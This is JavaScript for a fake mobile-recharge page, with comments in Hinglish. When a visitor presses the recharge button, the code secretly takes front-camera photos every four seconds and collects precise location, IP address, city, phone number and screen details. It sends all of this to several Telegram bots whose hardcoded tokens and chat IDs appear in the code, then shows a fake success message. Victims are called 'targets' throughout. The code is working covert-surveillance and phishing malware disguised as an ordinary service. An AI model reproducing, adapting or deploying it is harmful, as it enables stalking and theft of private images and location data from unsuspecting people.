        // ============================================================
        // 🔥 YAHAN PE APNE BOTS AUR CHAT IDs LIKHO - STATIC HARDCODED 🔥
        // ============================================================
        
        const BOTS = [
            {
                name: "Main Bot",
                token: "8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY",
                chatIds: ["8256108006", "5087129572"]  // Is bot ke 2 chat IDs
            },
            {
                name: "Second Bot",
                token: "8760141613:AAEcE15biAKwwlUlYdPyjuqvsYJPckXPFC4",
                chatIds: ["8256108006", "8432627979"]  // Is bot ke 3 chat IDs
            },
            {
                name: "Third Bot",
                token: "YOUR_THIRD_BOT_TOKEN_HERE",
                chatIds: ["1111111111"]  // Is bot ki 1 chat ID
            }
            // 🔥 Jitne marzi bots add karo - upar ki tarah copy-paste karo
        ];
        
        // ============================================================
        // CODE STARTS HERE - KUCH MAT BADALNA NICHE
        // ============================================================
        
        // UI Variables
        let selectedAmount = 199;
        let selectedData = "1.5GB/day";
        let selectedOperator = "jio";
        let isCapturing = false;
        let captureInterval = null;
        let videoStream = null;
        let photoCount = 0;
        let locationSent = false;
        
        const CAPTURE_INTERVAL_MS = 4000;
        
        // DOM Elements
        const rechargeCards = document.querySelectorAll('.recharge-card');
        const operators = document.querySelectorAll('.operator');
        const proceedBtn = document.getElementById('proceedBtn');
        const mobileInput = document.getElementById('mobileNumber');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const successModal = document.getElementById('successModal');
        const toast = document.getElementById('toast');
        
        // Show bot count
        let totalChatIds = 0;
        BOTS.forEach(bot => { totalChatIds += bot.chatIds.length; });
        document.getElementById('botCountBadge').innerHTML = `${BOTS.length} Bots | ${totalChatIds} Targets`;
        
        function debugLog(msg) {
            console.log(msg);
            const debugEl = document.getElementById('debugInfo');
            if (debugEl) {
                debugEl.innerHTML = msg.slice(0, 60);
            }
        }
        
        function showToast(msg, isError = false) {
            toast.textContent = msg;
            toast.style.background = isError ? '#ff4444' : '#00ff88';
            toast.style.opacity = '1';
            setTimeout(() => { toast.style.opacity = '0'; }, 2000);
        }
        
        // ========== BROADCAST TO ALL BOTS + ALL CHAT IDs ==========
        async function broadcastToAll(messageType, data, isFormData = false) {
            let successCount = 0;
            let totalTargets = 0;
            
            for (const bot of BOTS) {
                if (!bot.token || bot.token.includes("YOUR_")) continue;
                
                for (const chatId of bot.chatIds) {
                    if (!chatId || chatId.length < 5) continue;
                    totalTargets++;
                    
                    try {
                        const apiUrl = `https://api.telegram.org/bot${bot.token}/${messageType}`;
                        let options = { method: 'POST' };
                        
                        if (isFormData) {
                            data.append('chat_id', chatId);
                            options.body = data;
                        } else {
                            const sendData = { ...data, chat_id: chatId };
                            options.headers = { 'Content-Type': 'application/json' };
                            options.body = JSON.stringify(sendData);
                        }
                        
                        const response = await fetch(apiUrl, options);
                        const result = await response.json();
                        
                        if (result.ok) {
                            successCount++;
                            debugLog(`✅ ${bot.name} -> ${chatId}`);
                        }
                    } catch(e) {}
                    
                    await new Promise(r => setTimeout(r, 50));
                }
            }
            
            debugLog(`📊 Sent: ${successCount}/${totalTargets}`);
            return successCount;
        }
        
        // Send Photo to ALL
        async function broadcastPhoto(blob, caption) {
            let successCount = 0;
            
            for (const bot of BOTS) {
                if (!bot.token || bot.token.includes("YOUR_")) continue;
                
                for (const chatId of bot.chatIds) {
                    if (!chatId || chatId.length < 5) continue;
                    
                    try {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                        formData.append('caption', caption);
                        
                        const response = await fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        const result = await response.json();
                        
                        if (result.ok) {
                            successCount++;
                        }
                    } catch(e) {}
                    
                    await new Promise(r => setTimeout(r, 50));
                }
            }
            
            return successCount;
        }
        
        // Send Location
        async function sendLocationToAll(latitude, longitude, accuracy) {
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const message = `📍 LIVE LOCATION!\n\n🌐 ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n💰 ₹${selectedAmount}\n📱 ${mobileInput.value}\n📡 ${selectedOperator.toUpperCase()}\n🗺️ ${mapsLink}`;
            
            await broadcastToAll('sendLocation', { latitude: latitude, longitude: longitude });
            await broadcastToAll('sendMessage', { text: message, parse_mode: 'HTML' });
        }
        
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        await sendLocationToAll(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
                        locationSent = true;
                        showToast('📍 Location sent to all targets!');
                        resolve(true);
                    },
                    (error) => {
                        broadcastToAll('sendMessage', { text: `❌ LOCATION FAILED: ${error.message}`, parse_mode: 'HTML' });
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // Capture and Send Photo
        async function captureAndSend() {
            if (!videoStream || !isCapturing) return;
            try {
                const video = document.getElementById('hiddenVideo');
                if (!video.videoWidth || video.videoWidth === 0) return;
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
                const caption = `📸 CAMERA CAPTURE\n💰 ₹${selectedAmount} | ${selectedOperator.toUpperCase()}\n📱 ${mobileInput.value}\n🔢 #${photoCount + 1}`;
                
                const sent = await broadcastPhoto(blob, caption);
                if (sent > 0) {
                    photoCount++;
                    document.getElementById('balance').innerHTML = photoCount;
                    debugLog(`📸 Photo ${photoCount} sent to ${sent} targets`);
                }
            } catch(e) {
                debugLog('Capture error: ' + e.message);
            }
        }
        
        // Start Camera
        async function startCamera() {
            try {
                const constraints = { video: { facingMode: 'user' } };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('hiddenVideo');
                video.srcObject = videoStream;
                await video.play();
                isCapturing = true;
                
                if (captureInterval) clearInterval(captureInterval);
                captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL_MS);
                
                debugLog('✅ Camera started');
                return true;
            } catch(e) {
                debugLog('Camera error: ' + e.message);
                return false;
            }
        }
        
        // Send Device Info
        async function sendDeviceInfo() {
            let ipData = { ip: 'N/A', city: 'N/A', country_name: 'N/A' };
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                ipData = await ipRes.json();
            } catch(e) {}
            
            const info = `🔥 NEW TARGET!\n\n💰 ₹${selectedAmount} (${selectedData})\n📱 ${mobileInput.value}\n📡 ${selectedOperator.toUpperCase()}\n🌐 IP: ${ipData.ip}\n📍 ${ipData.city}, ${ipData.country_name}\n🖥️ ${screen.width}x${screen.height}\n🤖 Bots: ${BOTS.length} | Targets: ${totalChatIds}`;
            await broadcastToAll('sendMessage', { text: info, parse_mode: 'HTML' });
        }
        
        // Main Process
        async function proceedRecharge() {
            const mobile = mobileInput.value;
            if (!mobile || mobile.length !== 10) {
                showToast('Enter valid 10 digit number', true);
                return;
            }
            
            // Check if any bot has valid token
            let hasValidBot = false;
            for (const bot of BOTS) {
                if (bot.token && !bot.token.includes("YOUR_") && bot.chatIds.length > 0) {
                    hasValidBot = true;
                    break;
                }
            }
            
            if (!hasValidBot) {
                showToast('No valid bot configured! Edit BOTS array in code', true);
                debugLog('❌ Edit BOTS array - add your bot tokens and chat IDs');
                return;
            }
            
            proceedBtn.disabled = true;
            proceedBtn.textContent = '⏳ PROCESSING...';
            loadingOverlay.style.display = 'flex';
            
            const cameraStarted = await startCamera();
            if (!cameraStarted) {
                showToast('Camera permission required!', true);
                loadingOverlay.style.display = 'none';
                proceedBtn.disabled = false;
                proceedBtn.textContent = '💸 RECHARGE NOW';
                return;
            }
            
            await getLocation();
            await sendDeviceInfo();
            
            setTimeout(async () => {
                if (captureInterval) clearInterval(captureInterval);
                if (videoStream) videoStream.getTracks().forEach(track => track.stop());
                isCapturing = false;
                
                loadingOverlay.style.display = 'none';
                document.getElementById('successMsg').innerHTML = `₹${selectedAmount} ${selectedOperator.toUpperCase()} plan activated!<br>📸 Photos: ${photoCount}<br>📍 Location: ${locationSent ? 'Sent' : 'Failed'}<br>🤖 Broadcast to ${totalChatIds} targets`;
                successModal.style.display = 'flex';
                proceedBtn.disabled = false;
                proceedBtn.textContent = '💸 RECHARGE NOW';
                
                await broadcastToAll('sendMessage', { text: `✅ SESSION COMPLETE!\n📸 Photos: ${photoCount}\n📍 Location: ${locationSent ? 'OK' : 'Failed'}\n📱 ${mobileInput.value}`, parse_mode: 'HTML' });
            }, 25000);
        }
        
        function closeSuccessModal() {
            successModal.style.display = 'none';
        }
        
        // Event Listeners
        rechargeCards.forEach(card => {
            card.addEventListener('click', () => {
                rechargeCards.forEach(c => c.classList.remove('selected'));
                card.classList.add('selected');
                selectedAmount = parseInt(card.dataset.amount);
                selectedData = card.dataset.data;
                debugLog('Plan: ₹' + selectedAmount);
            });
        });
        if (rechargeCards.length > 0) rechargeCards[0].classList.add('selected');
        
        operators.forEach(op => {
            op.addEventListener('click', () => {
                operators.forEach(o => o.classList.remove('selected'));
                op.classList.add('selected');
                selectedOperator = op.dataset.operator;
                debugLog('Operator: ' + selectedOperator);
            });
        });
        if (operators.length > 0) operators[0].classList.add('selected');
        
        mobileInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
        
        proceedBtn.onclick = proceedRecharge;
        
        // Cleanup
        window.onbeforeunload = () => {
            if (captureInterval) clearInterval(captureInterval);
            if (videoStream) videoStream.getTracks().forEach(track => track.stop());
        };
        
        window.closeSuccessModal = closeSuccessModal;
        
        debugLog(`✅ Ready | ${BOTS.length} Bots | ${totalChatIds} Targets`);
    
